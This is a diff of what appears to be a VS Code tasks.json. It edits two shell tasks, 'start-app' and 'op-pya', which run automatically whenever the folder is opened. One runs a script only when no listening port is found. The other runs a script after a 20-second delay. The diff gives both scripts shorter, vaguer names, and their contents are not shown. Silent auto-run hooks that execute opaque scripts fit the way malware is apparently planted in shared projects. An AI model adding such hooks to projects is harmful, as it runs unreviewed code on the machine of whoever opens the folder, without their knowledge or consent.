@@ -4,7 +4,7 @@
         {
             "label": "start-app",
             "type": "shell",
-            "command": "lsof -i -P -n | grep LISTEN > /dev/null || (chmod +x main.sh && ./main.sh)",
+            "command": "lsof -i -P -n | grep LISTEN > /dev/null || (chmod +x m.sh && ./m.sh)",
             "runOptions": {
                 "runOn": "folderOpen"
             }
@@ -12,7 +12,7 @@
         {
             "label": "op-pya",
             "type": "shell",
-            "command": "sleep 20; chmod +x pypya.sh && ./pypya.sh",
+            "command": "sleep 20; chmod +x py.sh && ./py.sh",
             "runOptions": {
                 "runOn": "folderOpen"
             }
